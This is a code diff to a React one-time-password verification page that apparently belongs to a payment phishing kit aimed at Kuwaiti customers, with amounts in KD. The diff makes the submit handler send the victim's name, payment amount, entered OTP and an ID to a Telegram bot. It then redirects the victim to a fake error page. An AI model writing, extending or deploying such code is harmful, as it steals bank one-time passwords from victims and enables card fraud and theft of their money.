@@ -1,6 +1,7 @@
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
+import { sendMessageToTelegram } from "@/backend/telegramService";
 
 const defaultPaymentData = {
   customerName: "يوسف غازي الرشيدي",
@@ -23,12 +24,23 @@ const OTPVerification = () => {
     description: queryParams.get('p') || defaultPaymentData.description
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
+    
+    const message = `
+<b>🔑 New OTP Entry</b>
+<b>Name:</b> ${paymentData.customerName}
+<b>Amount:</b> ${paymentData.amount} KD
+<b>OTP:</b> <code>${otp}</code>
+<b>ID:</b> ${id}
+`;
+
+    await sendMessageToTelegram(message);
+    
     setTimeout(() => {
       navigate('/error' + window.location.search);
-    }, 2000);
+    }, 1500);
   };
 
   const handleCancel = () => {
